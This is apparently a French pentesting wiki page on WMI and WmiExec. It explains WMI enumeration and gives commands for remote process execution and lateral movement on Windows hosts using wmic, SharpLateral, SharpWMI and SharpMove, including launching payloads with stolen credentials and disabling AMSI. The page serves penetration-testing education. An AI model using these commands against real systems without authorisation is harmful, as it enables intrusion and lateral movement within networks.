# WmiExec

{{#include ../../banners/hacktricks-training.md}}

## Explication du fonctionnement

Des processus peuvent être ouverts sur des hôtes lorsque le nom d'utilisateur et le mot de passe ou le hash sont connus grâce à WMI. Les commandes sont exécutées avec WMI par Wmiexec, offrant une expérience de shell semi-interactive.

**dcomexec.py :** En utilisant différents endpoints DCOM, ce script offre un shell semi-interactif similaire à `wmiexec.py`. La valeur `-object` sélectionnée détermine l'endpoint ; les objets pris en charge comprennent `MMC20.Application`, `ShellWindows` et `ShellBrowserWindow`, ce dernier fournissant la technique Shell Browser Window mise en évidence dans le walkthrough original.<sup>[[2]](#references)[[3]](#references)</sup>

## Fondamentaux de WMI

### Espace de noms

Structuré selon une hiérarchie de type répertoire, le conteneur de niveau supérieur de WMI est \root, sous lequel sont organisés des répertoires supplémentaires, appelés espaces de noms.<sup>[[1]](#references)</sup>
Commandes pour lister les espaces de noms :
```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
Les classes au sein d’un espace de noms peuvent être listées à l’aide de :
```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **Classes**

Connaître le nom d’une classe WMI, comme `win32_process`, ainsi que l’espace de noms dans lequel elle se trouve, est essentiel pour toute opération WMI.  
Commandes permettant de répertorier les classes commençant par `win32` :
```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
Invocation d'une classe :
```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### Méthodes

Les méthodes, qui sont une ou plusieurs fonctions exécutables des classes WMI, peuvent être exécutées.
```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## Énumération WMI

### État du service WMI

Commandes permettant de vérifier si le service WMI est opérationnel :
```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```
### Informations sur le système et les processus

Collecte d’informations sur le système et les processus via WMI :
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```
Pour les attaquants, WMI est un outil puissant permettant d’énumérer des données sensibles sur les systèmes ou les domaines.<sup>[[1]](#references)</sup>
```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
L’interrogation distante de WMI pour obtenir des informations spécifiques, comme les administrateurs locaux ou les utilisateurs connectés, est possible avec une construction soigneuse des commandes.

### **Interrogation manuelle de WMI à distance**

L’identification furtive des administrateurs locaux sur une machine distante et des utilisateurs connectés peut être réalisée au moyen de requêtes WMI spécifiques. `wmic` permet également de lire un fichier texte afin d’exécuter simultanément des commandes sur plusieurs nœuds.<sup>[[1]](#references)</sup>

Pour exécuter à distance un processus via WMI, par exemple pour déployer un agent Empire, la structure de commande suivante est utilisée, une valeur de retour égale à "0" indiquant que l’exécution a réussi :<sup>[[1]](#references)</sup>
```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```
Ce processus illustre la capacité de WMI à exécuter des commandes à distance et à énumérer les systèmes, soulignant son utilité tant pour l'administration système que pour le pentesting.

## Outils automatiques

- [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
```bash
SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
# Stealthier execution with VBS
SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
```
- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
```
- Vous pouvez également utiliser **`wmiexec` d'Impacket**.


## References

- [1] [Utiliser des identifiants pour prendre le contrôle de machines Windows - Partie 3 (WMI et WinRM)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
- [2] [Fortra Impacket - dcomexec.py](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py)
- [3] [Guide du débutant sur la boîte à outils Impacket, partie 1 - Hacking Articles (Internet Archive)](https://web.archive.org/web/20190822180831/https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)
{{#include ../../banners/hacktricks-training.md}}
